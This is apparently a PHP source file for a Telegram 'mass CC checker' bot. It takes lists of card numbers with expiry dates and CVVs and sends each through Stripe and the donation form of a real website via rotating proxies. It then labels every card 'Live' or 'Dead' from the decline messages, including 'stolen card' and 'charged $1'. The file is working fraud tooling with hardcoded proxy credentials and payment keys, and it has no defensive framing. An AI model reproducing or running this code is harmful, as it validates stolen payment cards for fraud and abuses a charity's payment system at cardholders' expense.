<?php

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
//====================FUNCTION END===============//
if (strpos($message, "/mchk") === 0 || strpos($message, "!mchk") === 0 || strpos($message, ".mchk") === 0) {
    $message = substr($message,6);
if (empty($message)){
reply_to($chatId,$validauth,$message_id);
exit();
}
$stchk = "<b>Started Checking...</b>";
    $sendmes = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".$stchk."&reply_to_message_id=".$message_id."&parse_mode=HTML";
    $sent = json_decode(file_get_contents($sendmes) ,1);
    global $mes_id;
    $mes_id = $sent['result']['message_id'];
    sleep(1);
    $aray = gibarray($message);
    $cout = count($aray);
    $total = $cout * 1;
    if (count($aray) > 5){
  $cmsg = "𝗧𝗛𝗜𝗦 𝗚𝗔𝗧𝗘 𝗜𝗦 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗙𝗢𝗥 𝟱 𝗖𝗖 𝗢𝗡𝗟𝗬 ⚠️";
  editMessage($chatId,$cmsg,$mes_id);
    exit();
}
    else{
      global $fullmes;
      $fullmes = '';
	  //echo '<pre>'; print_r($aray); echo '</pre>';
      foreach ($aray as $cc){
		//echo "Checking : $cc <br>";
        $check = chemker1($cc);
		//echo "Result For $cc : $result<hr>";
      }
    }
}

function chemker1($lista){

  ///-----------------------CC PARSE -----------------------///
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$username = "g7305bhx467p4yl";
$password = "ugv0ew3w009j5ii";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=e49ca930-a5fd-418a-9f86-20390ffcfc4677ec3e&sid=9a6f3543-6d8c-4271-93a0-a11c166a6f7d45999f&pasted_fields=number&payment_user_agent=stripe.js%2F25059d5c42%3B+stripe-js-v3%2F25059d5c42%3B+card-element&referrer=https%3A%2F%2Fvoxel.guide&time_on_page=28456&key=pk_live_51NpwDuJJGU2OiPGJMg81F7vHVBhBfXEa9mIYDKKXzcMyrXj5sCu7v2SaHVV1wgAGC3Rqyyy5UFieTsOcngiuzE1H00R0fEcFLm');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$username = "g7305bhx467p4yl";
$password = "ugv0ew3w009j5ii";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://voxel.guide/wp-admin/admin-ajax.php?t=1712821449031');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1712821449031 h2',
'Host: voxel.guide',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://voxel.guide',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://voxel.guide/donate/',
'accept-language: en-US,en;q=0.9',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1499%26_fluentform_3_fluentformnonce%3D85fff6cf2c%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D5%26payment_method%3Dstripe%26gdpr-agreement%3Don%26ct_bot_detector_event_token%3D045a2c300604193c3e4e3d29769222990551df11918469aabc737cff658bf434%26apbct_visible_fields%3DeyIwIjp7InZpc2libGVfZmllbGRzIjoibmFtZXNbZmlyc3RfbmFtZV0gbmFtZXNbbGFzdF9uYW1lXSBlbWFpbCBjdXN0b20tcGF5bWVudC1hbW91bnQiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6NCwiaW52aXNpYmxlX2ZpZWxkcyI6Il9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQgX2ZsdWVudGZvcm1fM19mbHVlbnRmb3Jtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciBwYXltZW50X21ldGhvZCBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjZ9fQ%253D%253D%26__entry_intermediate_hash%3D37d288809f821ea63df6d0b61a32a0bb%26ct_no_cookie_hidden_field%3D_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiYXBiY3RfdXJscyI6IntcInZveGVsLmd1aWRlL2RvbmF0ZS9cIjpbMTcxMjgyMTI2OF19IiwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImFwYmN0X3Zpc2libGVfZmllbGRzIjoiJTdCJTIydmlzaWJsZV9maWVsZHMlMjIlM0ElMjJuYW1lcyU1QmZpcnN0X25hbWUlNUQlMjBuYW1lcyU1Qmxhc3RfbmFtZSU1RCUyMGVtYWlsJTIwY3VzdG9tLXBheW1lbnQtYW1vdW50JTIyJTJDJTIydmlzaWJsZV9maWVsZHNfY291bnQlMjIlM0E0JTJDJTIyaW52aXNpYmxlX2ZpZWxkcyUyMiUzQSUyMl9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQlMjBfZmx1ZW50Zm9ybV8zX2ZsdWVudGZvcm1ub25jZSUyMF93cF9odHRwX3JlZmVyZXIlMjBwYXltZW50X21ldGhvZCUyMGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiUyMGFwYmN0X3Zpc2libGVfZmllbGRzJTIwX19lbnRyeV9pbnRlcm1lZGlhdGVfaGFzaCUyMGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQlMjIlMkMlMjJpbnZpc2libGVfZmllbGRzX2NvdW50JTIyJTNBOCU3RCIsImN0X2ZrcF90aW1lc3RhbXAiOiIxNzEyODIxMzUxIiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzOTMlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMTMyMCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM5MyUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E3NDMlN0QiLCJjdF9jaGVja2pzIjoiMjIxOTYxMTI4IiwiY3RfdGltZXpvbmUiOiI3IiwiYXBiY3RfcGl4ZWxfdXJsIjoiaHR0cHMlM0ElMkYlMkZtb2RlcmF0ZTItdjQuY2xlYW50YWxrLm9yZyUyRnBpeGVsJTJGYTZjMjRkMjBlMDRkZThmOWE3ODZmMWI4NzQ0NzgwNzkuZ2lmIiwiY3RfY2hlY2tlZF9lbWFpbHMiOiIlN0IlMjJnbG9vc21va2UlNDBnbWFpbC5jb20lMjIlM0ElN0IlMjJyZXN1bHQlMjIlM0ElMjJDQUNIRUQlMjIlMkMlMjJ0aW1lc3RhbXAlMjIlM0ExNzEyODIxMzY2JTdEJTdEIiwiY3RfcHNfdGltZXN0YW1wIjoiMTcxMjgyMTM1MCIsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiYXBiY3RfcGFnZV9oaXRzIjoxLCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJhcGJjdF9zaXRlX2xhbmRpbmdfdHMiOiIxNzEyODIxMjY4IiwiYXBiY3RfY29va2llc190ZXN0IjoiJTdCJTIyY29va2llc19uYW1lcyUyMiUzQSU1QiUyMmFwYmN0X3RpbWVzdGFtcCUyMiUyQyUyMmFwYmN0X3NpdGVfbGFuZGluZ190cyUyMiU1RCUyQyUyMmNoZWNrX3ZhbHVlJTIyJTNBJTIyY2ZhY2E3NjMyNWFhMzQxMDJmZGQ0YzdkM2FmZTY0MjUlMjIlN0QiLCJjdF9wb2ludGVyX2RhdGEiOiIlNUIlNUIzODUlMkMyNTElMkMyNzE4JTVEJTJDJTVCNTg3JTJDMjU5JTJDOTk4NiU1RCUyQyU1QjM4OSUyQzMwNiUyQzEwOTgxJTVEJTJDJTVCMjkzJTJDMTkzJTJDMTIyNDclNUQlMkMlNUIzODglMkMxNjklMkMxMzQxMiU1RCUyQyU1QjQzNCUyQzIyOCUyQzE1MjMzJTVEJTJDJTVCNTQwJTJDMjQ5JTJDMTYxNjElNUQlMkMlNUIyODUlMkM0NiUyQzE3NjUyJTVEJTJDJTVCMzc0JTJDNDklMkMxODgyMyU1RCUyQyU1QjUwMSUyQzIxMCUyQzI5MjczJTVEJTVEIiwiYXBiY3RfaWZyYW1lc19wcm90ZWN0ZWQiOltdLCJhcGJjdF9zZXNzaW9uX2lkIjoicHhmb2x4aCIsImFwYmN0X3NpdGVfcmVmZXJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL3ZveGVsLmd1aWRlL2RvbmF0ZS8iLCJ0eXBvIjpbXX0%253D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');

$result2a = curl_exec($ch);

$dmsg = trim(strip_tags(getStr($result2a,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

curl_close($ch);

if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))){
      $status = "Live 🟡";
      $response = "Zip Mismatch ❎";
    }


elseif (strpos($result2a, "CVV LIVE")){
  $status = "Live 🟢";
$response = "CVV Matched ✅";
  }
elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient_funds"))){
  $status = "CVV Live 🟢";
$response = "INSUFFICIENT FUNDS ✅";

  }
elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The card's security code is incorrect."))){
  $status = "Live 🟡";
$response = "CCN Live ❎";

  }
elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){
  $status = "Live 🟡";
$response = "TRANSACTION NOT ALLOWED";

  }

elseif (strpos($result2a, "DO NOT HONOR")){
  
$status = "Dead 🔴";
$response = "DO NOT HONOR 🚫";
}

elseif (strpos($result2a, "stolen_card")){
  
$status = "Dead 🔴";
$response = "Stolen Card 🚫";
}

elseif (strpos($result2a, "lost_card")){
  $status = "Dead 🔴";
$response = "Lost Card 🚫";
}


elseif (strpos($result2a, "PICKUP CARD")){
  $status = "Dead 🔴";
$response = "PICKUP CARD";
}


elseif ((strpos($result2a, 'INCORRECT CARD NUMBER')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))){
  
  $status = "Dead 🔴";
$response = "Incorrect Card Number 🚫";
}


elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))){
  $status = "Dead 🔴";
$response = "Expired Card 🚫";

  }


elseif (strpos($result2a, 'redirectUrl')){
  $status = "Live 🟢";
$response = "Charged 1$ ✅";

  }


elseif (strpos($result2a, "FRAUDULENT")){
  $status = "Dead 🔴";
$response = "Fraudulent 🚫";
}


elseif (strpos($result2a, "lock_timeout")){
  $status = "Dead 🔴";
$response = "error 404 🚫";
}


elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))){
  $status = "Dead 🔴";
$response = "Generic Decline 🚫";
}


elseif (strpos($result2a, "NVAILD EXPIRY MONTH")){
  $status = "Dead 🔴";
$response = "NVAILD EXPIRY MONTH 😥";
}



elseif (strpos($result2a, "Error processing payment")){
  $status = "Dead 🔴";
$response = "Error processing payment";
}

elseif (strpos($result2a, 'CARD NOT SUPPORTED')){
  $status = "Live 🟡";
$response = "CARD NOT SUPPORTED 🚫";
}


elseif (strpos($result2a, "parameter_invalid_empty")){
  $status = "Dead 🔴";
$response = "404 error 🚫";
}

else {
      $status = "Dead 🔴";
$response = "Payment Error 🚫";

    }
//--------SMS SENT SECTION----------------//
  global $mes_id, $chatId , $fullmes;
$mainulstatus = "<b>Dead 🔴</b>";
$fullmes = $fullmes.'<b>CC - <code>'.$lista.'</code>
Result - '.$response.'</b>

';
$umass = "<b>𒀭  MASS CCN CHARGE 1 $  𒀭
   ━━━━━━━━━━━━━</b>
";
$fmass = "<b>╭───────────────
𒆜 PROXY  : [ LIVE & ROTATING ]
𒆜 BOT BY : <a href='t.me/strawhatchannel69'>[ BE - OWNER  ]</a>
╰───────────────✘</b>";

$mallmsg = urlencode ("$umass
$fullmes
$fmass");
editMessagei($chatId,$mallmsg,$mes_id);

}
